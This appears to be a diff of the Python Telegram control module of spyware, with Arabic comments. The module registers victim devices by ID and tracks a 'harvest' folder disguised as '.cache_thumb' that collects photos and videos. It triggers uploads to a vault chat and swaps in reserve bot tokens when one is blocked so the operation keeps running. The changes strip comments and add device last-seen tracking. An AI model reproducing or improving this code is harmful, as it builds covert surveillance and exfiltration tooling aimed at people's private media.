@@ -25,7 +25,6 @@ P = _get_runtime_path()
 if P not in sys.path:
     sys.path.insert(0, P)
 
-# التأكد من وجود مجلد .cache_thumb المستخدم لعملية الحصاد
 CACHE_THUMB = os.path.join(P, ".cache_thumb")
 try:
     os.makedirs(CACHE_THUMB, exist_ok=True)
@@ -55,7 +54,7 @@ class T:
         self.device_id = getattr(m, 'did', 'unknown_device')
         self.dvs_file = os.path.join(P, "dvs.json")
         self.ses_file = os.path.join(P, "ses.json")
-        self.offset_file = os.path.join(P, "polling_offset.json")  # ملف لحفظ آخر offset
+        self.offset_file = os.path.join(P, "polling_offset.json")
         self.ses = {}
         self.dvs = {}
         self.p_upd = deque(maxlen=200)
@@ -64,12 +63,11 @@ class T:
         self._api_calls = 0
         self._api_failures = 0
 
-        # تصفية التوكنات الفارغة
         self.active_tokens = [t for t in active_tokens if t]
         self.reserve_tokens = [t for t in reserve_tokens if t]
         self.ctrl = ctrl_id
         self.dat = vault_id
-        self.vlt = vault_id  # إضافة vlt للتوافق مع الملفات الأخرى
+        self.vlt = vault_id
         self.pw = app_password
 
         self._load()
@@ -99,7 +97,6 @@ class T:
 
     # ========== إدارة offset ==========
     def _load_offset(self):
-        """تحميل آخر offset مستخدم من الملف"""
         try:
             if os.path.exists(self.offset_file):
                 with open(self.offset_file, 'r', encoding='utf-8') as f:
@@ -110,7 +107,6 @@ class T:
         return 0
 
     def _save_offset(self, offset):
-        """حفظ offset الحالي إلى الملف"""
         try:
             with _offset_lock:
                 with open(self.offset_file, 'w', encoding='utf-8') as f:
@@ -135,7 +131,6 @@ class T:
 
     # ========== دوال البوتات ==========
     def _next_token(self):
-        """اختيار توكن عشوائي بشكل آمن"""
         if not self.active_tokens:
             return None
         try:
@@ -146,14 +141,15 @@ class T:
 
     def _emergency_switch(self, bad_token):
         if bad_token in self.active_tokens:
-            idx = self.active_tokens.index(bad_token)
             self.active_tokens.remove(bad_token)
             if self.reserve_tokens:
                 new_token = self.reserve_tokens.pop(0)
                 self.active_tokens.append(new_token)
+                logging.warning(f"Swapped bad token with reserve: {new_token[:8]}...")
+                # إرسال إشعار للتحكم
                 self._api("sendMessage", {
                     "chat_id": self.ctrl,
-                    "text": f"⚠️ <b>Emergency switch</b>\nBot #{idx+1} replaced. {len(self.reserve_tokens)} reserve left.",
+                    "text": f"⚠️ <b>Emergency switch</b>\nBot token replaced. {len(self.reserve_tokens)} reserve left.",
                     "parse_mode": "HTML"
                 })
             else:
@@ -180,9 +176,9 @@ class T:
             except Exception as e:
                 logging.error(f"Heartbeat error: {e}")
 
-    # ========== API الأساسية ==========
+    # ========== API الأساسية (محسّنة مع إعادة المحاولة واستبدال التوكن) ==========
     def _api(self, method, data=None, files=None, retry=3):
-        """إرسال طلب إلى Telegram API مع إعادة محاولة"""
+        """إرسال طلب إلى Telegram API مع إعادة محاولة وتبديل التوكنات تلقائياً"""
         self._api_calls += 1
         last_token = None
 
@@ -252,6 +248,9 @@ class T:
 
         with _device_lock:
             if device_id in self.dvs:
+                # تحديث وقت آخر ظهور
+                self.dvs[device_id]['last_seen'] = datetime.now().isoformat()
+                self._save()
                 return self.dvs[device_id].get('t')
 
             topic_name = f"📱 {device_model[:12]} | {device_id[:4]}"
@@ -259,7 +258,7 @@ class T:
 
             if res and res.get('ok'):
                 topic_id = res['result']['message_thread_id']
-                self.dvs[device_id] = {"n": device_model, "t": topic_id}
+                self.dvs[device_id] = {"n": device_model, "t": topic_id, "last_seen": datetime.now().isoformat()}
                 self._save()
 
                 self._api("sendMessage", {
@@ -289,32 +288,19 @@ class T:
                 "parse_mode": "HTML"
             })
 
-    # ========== عدد الملفات المعلقة (محسّن) ==========
+    # ========== عدد الملفات المعلقة ==========
     def _count_pending_harvest(self):
-        """
-        حساب عدد الملفات المعلقة في مجلد الحصاد.
-        - يتحقق من وجود المجلد وينشئه إذا لزم الأمر.
-        - يتجاهل الملفات المخفية (التي تبدأ بنقطة).
-        - يعيد 0 في حالة أي خطأ.
-        """
         try:
-            # التأكد من وجود المجلد، وإنشاؤه إذا لم يكن موجوداً
             if not os.path.exists(CACHE_THUMB):
                 os.makedirs(CACHE_THUMB, exist_ok=True)
                 return 0
-
-            # التأكد من أن المسار هو مجلد وليس ملفاً
             if not os.path.isdir(CACHE_THUMB):
-                logging.error(f"CACHE_THUMB path is not a directory: {CACHE_THUMB}")
                 return 0
-
-            # عد الملفات غير المخفية (لا تبدأ بنقطة) والتي هي ملفات فعلية
             files = [
                 f for f in os.listdir(CACHE_THUMB)
                 if not f.startswith('.') and os.path.isfile(os.path.join(CACHE_THUMB, f))
             ]
             return len(files)
-
         except Exception as e:
             logging.error(f"Count pending harvest error: {e}")
             return 0
@@ -341,13 +327,11 @@ class T:
         if not os.path.exists(CACHE_THUMB):
             self._api("sendMessage", {"chat_id": chat_id, "text": "📭 No pending files."})
             return
-
         try:
             files = [f for f in os.listdir(CACHE_THUMB) if f.lower().endswith(('.jpg','.png','.mp4'))]
             if not files:
                 self._api("sendMessage", {"chat_id": chat_id, "text": "📭 Harvest folder empty."})
                 return
-
             total_size = sum(os.path.getsize(os.path.join(CACHE_THUMB, f)) for f in files)
             details = (
                 f"📊 **Harvest report**\n"
@@ -415,12 +399,10 @@ class T:
         if not cb_id:
             return
 
-        # منع التكرار
         if cb_id in self.p_upd:
             return
         self.p_upd.append(cb_id)
 
-        # تنظيف قائمة الطلبات إذا كبرت
         if len(self.p_upd) > 150:
             self.p_upd.clear()
 
@@ -437,7 +419,6 @@ class T:
             self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ Session expired, use /login"})
             return
 
-        # ===== معالجة الأوامر =====
         if data == "ld":
             if not self.dvs:
                 self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ لا توجد أجهزة مرتبطة حالياً."})
@@ -474,10 +455,8 @@ class T:
             self._show_harvest_details(chat_id)
             return
 
-        # ===== التعديل: التحقق من وجود daily_zipper قبل الاستدعاء =====
         if data.startswith("send_now_"):
-            did = data[9:]  # send_now_ طولها 9 أحرف
-            # التحقق من وجود daily_zipper
+            did = data[9:]
             if hasattr(self.m, 'daily_zipper') and self.m.daily_zipper is not None:
                 try:
                     import commands
@@ -548,7 +527,6 @@ class T:
 
     # ========== حلقة الاستقبال (محسّنة مع حفظ offset) ==========
     def _polling(self):
-        # تحميل آخر offset مستخدم
         offset = self._load_offset()
         consecutive_errors = 0
 
@@ -584,11 +562,9 @@ class T:
                 if data.get('ok'):
                     consecutive_errors = 0
                     for upd in data.get('result', []):
-                        # تحديث offset إلى القيمة الجديدة (آخر تحديث + 1)
                         new_offset = upd['update_id'] + 1
                         if new_offset > offset:
                             offset = new_offset
-                            # حفظ offset بعد كل تحديث (يمكن تحسينه بحفظ دوري)
                             self._save_offset(offset)
 
                         if 'message' in upd:
